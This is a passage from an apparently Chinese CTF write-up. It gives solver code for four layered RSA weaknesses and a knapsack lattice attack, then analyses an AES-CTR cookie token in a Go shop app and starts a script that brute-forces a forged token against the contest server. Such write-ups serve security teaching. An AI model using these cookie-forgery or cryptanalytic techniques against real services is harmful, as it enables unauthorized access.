Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall3_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = <span class="number">3</span></span><br><span class="line">        self.m = chall3_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># challenge4.py</span></span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> challenges <span class="keyword">import</span> chall4_secret</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">RSAServe</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>) -&gt; <span class="literal">None</span>:</span><br><span class="line">        self.p = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.q = getPrime(<span class="number">512</span>)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        self.m = chall4_secret</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">self</span>):</span><br><span class="line">        m_ = bytes_to_long(self.m)</span><br><span class="line">        c = <span class="built_in">pow</span>(m_, self.e, self.p*self.q)</span><br><span class="line">        self.e = getPrime(<span class="number">17</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">hex</span>(c)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, msg</span>):</span><br><span class="line">        <span class="keyword">return</span> msg == self.m</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">pubkey</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">return</span> self.p*self.q, self.e</span><br></pre></td></tr></table></figure></blockquote><p>求解四层RSA拿flag。</p><p>第一层，$m&lt;p$，无需完全分解 $n$。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">n = <span class="number">322341817140424854310546430443927118765748131714269745607168549026570389299661764844365062948036437</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = <span class="number">304198953434620851532952216290120837853</span></span><br><span class="line">c = <span class="number">0x22ca52bc2ed70d7133a0916529d73ed1e91f36f6d7d7118d40de0cdae89c692d637a28727a4b90077d</span></span><br><span class="line">d = inverse_mod(e,p-<span class="number">1</span>)</span><br><span class="line">m = <span class="built_in">int</span>(<span class="built_in">pow</span>(c%p,d,p))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment"># b&#x27;m&lt;n_But_also_m&lt;p&#x27;</span></span><br></pre></td></tr></table></figure><p>第二层，$\gcd(n1,n2)=p$，交互两次数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n1 = <span class="number">85985649208163776168434106703299680942043569819886697084537149593016735251489437349033723731635167019919946528408991797589149306964593269240843489773393816361050438737217630268220265477449408440087731905143882172966401806119978492409284761350964437389319354732032636067387214869765942537900408255046554977317</span></span><br><span class="line">c1 = <span class="number">0x75124a122559d227bb846448b401877c86e7ac67dc5a1329622a6b54bbae91d3bc5a9afb859d86d90ac24cdd76cc7fa0763be082d9aa9f0c487d44f7a0725d6f195d6168837468c505f92dd1da29b618e3de01292a9592a1b2ce3d4dcdc4cad202c3c1fe190bb2469cf401b1a2fef29b8e487db908f30085e262ef84e6501118</span></span><br><span class="line">n2 = <span class="number">59612565629569243187927748458601473421039478282275869456898180179757129074951912462324655640636883153553671190318605493897644967308094259008273993958933708638671942944003571666749098289527528628582925016986696150709641914606485011406578947680624107267500302631283661241951979431008098395802457051450378936263</span></span><br><span class="line">c2 = <span class="number">0x23db0d9129161ba5318a43bf18db2ac276faa8e6f75b9a48250dbbc04de5b6a67764f8f8917f3f11e4b7308d7563f262500abcc59f0dc44bdc20d438e9ad424dbf7b7187b6cab4eeb5b32fdeb800e8dd6afcea3f97d97bac3be5a5fe9fbb06717dbf43f68cf0f91754e4f89e9a606b21c1467d3b8a7a0ed10e40f3bfb1e81a6a</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">p = gcd(n1,n2)</span><br><span class="line">q1 = n1//p</span><br><span class="line">f = (p-<span class="number">1</span>)*(q1-<span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e,f)</span><br><span class="line">m = <span class="built_in">pow</span>(c1,d,n1)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;make_all_modulus_independent&#x27;</span></span><br></pre></td></tr></table></figure><p>第三层，$e=3$，$m^e \lt n$，小 $e$ 攻击。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">62704397894391666479295080309251941192000653454396729807060395416391202444260383706554703418832720336900862424454646857290291688832249601582850489926515630514103107259941315796861595330414857499788329730467181727640390968106751789752583882632594974153970877867469382083206724358855594117005793286924964786309</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">c = <span class="number">0xfec61958cefda3eb5f709faa0282bffaded0a323fe1ef370e05ed3744a2e53b55bdd43e9594427c35514505f26e4691ba86c6dcff6d29d69110b15b9f84b0d8eb9ea7c03aaf24fa957314b89febf46a615f81ec031b12fe725f91af9d269873a69748</span></span><br><span class="line">m = gmpy2.iroot(c,e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;encrypt_exponent_should_be_bigger&#x27;</span></span><br></pre></td></tr></table></figure><p>第四层，共模攻击，交互两次数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2 <span class="keyword">as</span> gp</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">egcd</span>(<span class="params">a, b</span>):</span><br><span class="line"><span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line"><span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">g, y, x = egcd(b % a, a)</span><br><span class="line"><span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">n = <span class="number">95910070679089754882020609736361209978330742771232029437332648538529286081128112666433856280432204891053831926879516053786710256434719058164494668021689267490579582989448124586518700994273232858281123929454653035358779110102882528619796861827968986375140987711988221162025924201304147782787221328299013679367</span></span><br><span class="line">e1 = <span class="number">81919</span></span><br><span class="line">c1 = <span class="number">0x1d884ae280842f2c9f26fd4ec97d3e4d8d58cbe2ec0420f2179451663b873989d9dac3d796f6be72c982f82cd96dc346620c7028e48d0059acaa0242b36646c82e08a3e327ca0e2ee5f5cba574ad02953f3302963cd75760ea6bb5d8bc955b0b3d1c4f885d20cb8bb2d720331cba9fb0fb6a433e2b1f1ac588cf820be4169add</span></span><br><span class="line">e2 = <span class="number">108041</span></span><br><span class="line">c2 = <span class="number">0x69bd0266cd0c825ea1ac562385bb42be7040e1002e31f73c4139127577aa1d9d2a5cc05236bf03afb126202609e9fecc717bd229145bc7c5972a05476a8b66b8be1740f4f468ac24e9d8ed3ed5836a537aed77ad910bbb185a0421ed9faf97776e128058563ef0520e9fdf6ad47408da86ed02ab46761b962f8f34750c3791e1</span></span><br><span class="line"></span><br><span class="line">s = egcd(e1, e2)</span><br><span class="line">s1 = s[<span class="number">1</span>]</span><br><span class="line">s2 = s[<span class="number">2</span>]</span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">s1 = - s1</span><br><span class="line">c1 = gp.invert(c1, n)</span><br><span class="line"><span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">s2 = - s2</span><br><span class="line">c2 = gp.invert(c2, n)</span><br><span class="line"></span><br><span class="line">m = <span class="built_in">pow</span>(c1,s1,n)*<span class="built_in">pow</span>(c2,s2,n) % n</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(m)[<span class="number">2</span>:]))</span><br><span class="line"><span class="comment">#b&#x27;never_uese_same_modulus&#x27;</span></span><br></pre></td></tr></table></figure><p>四次提交正确得flag：<code>hgame&#123;W0w_you^knowT^e_CoMm0n_&amp;t$ack_@bout|RSA&#125;</code>。</p><p>​    </p><h3 id="包里有什么"><a href="#包里有什么" class="headerlink" title="包里有什么"></a>包里有什么</h3><blockquote><p>兔兔收到了一包年货，但是他忘了里面有什么了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> gcd, s2n</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">plain = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&#x27;hgame&#123;&#x27;</span> + plain + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">v = <span class="built_in">bin</span>(s2n(plain))[<span class="number">2</span>:]</span><br><span class="line">l = <span class="built_in">len</span>(v)</span><br><span class="line">a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">m = randint(<span class="built_in">sum</span>(a), <span class="number">2</span> &lt;&lt; l + <span class="number">1</span>)</span><br><span class="line">w = randint(<span class="number">0</span>, m)</span><br><span class="line"><span class="keyword">assert</span> gcd(w, m) == <span class="number">1</span></span><br><span class="line">b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line"></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    c += b[i] * <span class="built_in">int</span>(v[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m = <span class="subst">&#123;m&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b0 = <span class="subst">&#123;b[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line"><span class="comment"># b0 = 69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line"><span class="comment"># c = 93602062133487361151420753057739397161734651609786598765462162</span></span><br></pre></td></tr></table></figure></blockquote><p>先利用 $b_0$ 求 $w$，再解背包密码。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="number">1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line">b0 = <span class="number">69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line">c = <span class="number">93602062133487361151420753057739397161734651609786598765462162</span></span><br><span class="line"></span><br><span class="line">w = b0//<span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 预估长度</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">3</span>):</span><br><span class="line">    l = m.nbits() - k</span><br><span class="line">    a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">    b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line">    </span><br><span class="line">    pk =  b</span><br><span class="line">    ct =  c</span><br><span class="line">    n = <span class="built_in">len</span>(pk)</span><br><span class="line"></span><br><span class="line">    M = Matrix.identity(n) * <span class="number">2</span></span><br><span class="line"></span><br><span class="line">    last_row = [<span class="number">1</span> <span class="keyword">for</span> x <span class="keyword">in</span> pk]</span><br><span class="line">    M_last_row = Matrix(ZZ, <span class="number">1</span>, <span class="built_in">len</span>(last_row), last_row)</span><br><span class="line"></span><br><span class="line">    last_col = pk</span><br><span class="line">    last_col.append(ct)</span><br><span class="line">    M_last_col = Matrix(ZZ, <span class="built_in">len</span>(last_col), <span class="number">1</span>, last_col)</span><br><span class="line"></span><br><span class="line">    M = M.stack(M_last_row)</span><br><span class="line">    M = M.augment(M_last_col)</span><br><span class="line"></span><br><span class="line">    X = M.BKZ()</span><br><span class="line"></span><br><span class="line">    sol = []</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n + <span class="number">1</span>):</span><br><span class="line">        testrow = X.row(i).<span class="built_in">list</span>()[:-<span class="number">1</span>]</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">set</span>(testrow).issubset([-<span class="number">1</span>, <span class="number">1</span>]):</span><br><span class="line">            <span class="keyword">for</span> v <span class="keyword">in</span> testrow:</span><br><span class="line">                <span class="keyword">if</span> v == <span class="number">1</span>:</span><br><span class="line">                    sol.append(<span class="number">0</span>)</span><br><span class="line">                <span class="keyword">elif</span> v == -<span class="number">1</span>:</span><br><span class="line">                    sol.append(<span class="number">1</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">    s = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(<span class="string">&#x27;&#x27;</span>.join(<span class="built_in">map</span>(<span class="built_in">str</span>,sol)),<span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">    <span class="built_in">print</span>(s)</span><br><span class="line">    </span><br><span class="line"><span class="comment"># b&#x27;:/b2\x83.F\x832z2\x1a\x82v&#123;\x1a\x82Z2G&quot;\x82Z/\x03&#x27;</span></span><br><span class="line"><span class="comment"># b&#x27;b\xe8N\xe6\xbeh\xdc\xbef\xc2\xe6\xf2\xbe\xc4\xc2r\xbe\xd2\xe6\xdcn\xbe\xd2\xe8~&#x27;</span></span><br><span class="line"><span class="comment"># b&quot;1t&#x27;s_4n_3asy_ba9_isn7_it?&quot;</span></span><br></pre></td></tr></table></figure><p>​    </p><h3 id="零元购年货商店"><a href="#零元购年货商店" class="headerlink" title="零元购年货商店"></a>零元购年货商店</h3><blockquote><p>听说兔兔要买年货，正好提瓦特大陆的璃月海灯节也要到了，tr0uble特地为兔兔准备了一份flag大礼。嗯，你也想要？不可以哦。</p></blockquote><p><code>router/router.go</code> 里主要逻辑：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">loginController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">_, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err == <span class="literal">nil</span> &#123;</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">userName := c.PostForm(<span class="string">&quot;username&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> userName == <span class="string">&quot;Vidar-Tu&quot;</span> &#123;</span><br><span class="line">c.String(http.StatusForbidden, <span class="string">&quot;兔兔才不可能是你呢！！&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">User := user.User&#123;Name: userName, Created: time.Now().Unix(), Uid: <span class="string">&quot;230555433&quot;</span>&#125;</span><br><span class="line">jsonUser, _ := json.Marshal(User)</span><br><span class="line">token, _ := util.Encrypt(<span class="type">string</span>(jsonUser))</span><br><span class="line">c.SetCookie(<span class="string">&quot;token&quot;</span>, token, <span class="number">3600</span>, <span class="string">&quot;/&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">false</span>, <span class="literal">true</span>)</span><br><span class="line">c.Redirect(http.StatusFound, <span class="string">&quot;/home&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">buyController</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">method := c.Request.Method</span><br><span class="line">token, err := c.Cookie(<span class="string">&quot;token&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusForbidden, <span class="string">&quot;没有身份的人可不能来这儿买东西。&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">jsonUser, err := util.Decrypt(token)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusBadGateway, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">User := user.User&#123;&#125;</span><br><span class="line">err = json.Unmarshal([]<span class="type">byte</span>(jsonUser), &amp;User)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">c.String(http.StatusBadGateway, err.Error())</span><br><span class="line">&#125;</span><br><span class="line">name := User.Name</span><br><span class="line"><span class="keyword">if</span> method != http.MethodGet &#123;</span><br><span class="line">c.String(http.StatusMethodNotAllowed, fmt.Sprintf(<span class="string">&quot;your method: %s. but only get method allowed&quot;</span>, method))</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">product := c.Query(<span class="string">&quot;prod&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> product == <span class="string">&quot;flag&quot;</span> &#123;</span><br><span class="line"><span class="keyword">if</span> name != <span class="string">&quot;Vidar-Tu&quot;</span> &#123;</span><br><span class="line">c.String(http.StatusOK, <span class="string">&quot;flag 可是特地为兔兔准备的！&quot;</span>)</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">file, _ := os.Open(<span class="string">&quot;flag.txt&quot;</span>)</span><br><span class="line">flag, _ := io.ReadAll(file)</span><br><span class="line">c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;%s buy %s successfully\n%s&quot;</span>, name, product, flag))</span><br><span class="line">&#125;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">c.String(http.StatusOK, fmt.Sprintf(<span class="string">&quot;%s buy %s successfully&quot;</span>, name, product))</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>需要token里userName值为 <code>Vidar-Tu</code>，但不能直接输入 <code>Vidar-Tu</code>。</p><p>查看 <code>util/util.go</code> 里：</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> util</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line"><span class="string">&quot;crypto/aes&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/cipher&quot;</span></span><br><span class="line"><span class="string">&quot;crypto/rand&quot;</span></span><br><span class="line"><span class="string">&quot;encoding/base64&quot;</span></span><br><span class="line"><span class="string">&quot;errors&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> key = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">16</span>)</span><br><span class="line"><span class="keyword">var</span> iv = <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">_, _ = rand.Read(key)</span><br><span class="line">_, _ = rand.Read(iv)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Encrypt</span><span class="params">(u <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">block, err := aes.NewCipher(key)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, err</span><br><span class="line">&#125;</span><br><span class="line">plainText := []<span class="type">byte</span>(u)</span><br><span class="line">blockMode := cipher.NewCTR(block, iv)</span><br><span class="line">cipherText := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(plainText))</span><br><span class="line">blockMode.XORKeyStream(cipherText, plainText)</span><br><span class="line"><span class="keyword">return</span> base64.StdEncoding.EncodeToString(cipherText), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Decrypt</span><span class="params">(cipherText <span class="type">string</span>)</span></span> (<span class="type">string</span>, <span class="type">error</span>) &#123;</span><br><span class="line">decodeData, err := base64.StdEncoding.DecodeString(cipherText)</span><br><span class="line"><span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line"><span class="keyword">return</span> <span class="string">&quot;&quot;</span>, errors.New(<span class="string">&quot;invalid base64&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">block, err := aes.NewCipher(key)</span><br><span class="line">blockMode := cipher.NewCTR(block, iv)</span><br><span class="line">plainText := <span class="built_in">make</span>([]<span class="type">byte</span>, <span class="built_in">len</span>(decodeData))</span><br><span class="line">blockMode.XORKeyStream(plainText, decodeData)</span><br><span class="line"><span class="keyword">return</span> <span class="type">string</span>(plainText), <span class="literal">nil</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>token的使用AES-CTR模式加密生成，而在CTR模式中， 有一个自增的算子（IV，后四个字节相当于计数器，每次计算递增），这个算子用密钥加密之后的输出和明文异或的结果得到密文，相当于一次一密，即 $m \oplus \text{keystream} = c$。</p><p>用户名和token为一一对应关系，输入 <code>Vidar-Tv</code> 和 <code>Vidar-Tw</code> 获取对应token的base64字符串，找到改变的字符，爆破：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> quote</span><br><span class="line"></span><br><span class="line">s = requests.Session()</span><br><span class="line"></span><br><span class="line">dic = string.ascii_letters+string.digits+<span class="string">&#x27;+/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> dic:</span><br><span class="line">    token = <span class="string">f&#x27;NnL3arZc7tt+ezcky+B8fF<span class="subst">&#123;k&#125;</span>75UtdWR6yUOD2rbYBBnIFPp1Rl/HXFxRPBwNeTzi2R2Wm5AVZQRwt+A==&#x27;</span></span><br><span class="line">    url = <span class="string">&#x27;http://week-2.hgame.lwsec.cn:30036/buy?prod=firecracker&#x27;</span></span><br><span class="line">    r = s.get(url, cookies=&#123;<span class="string">&#x27;token&#x27;</span>:quote(token)&#125;)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Vidar-Tu&#x27;</span> <span class="keyword">in</span> 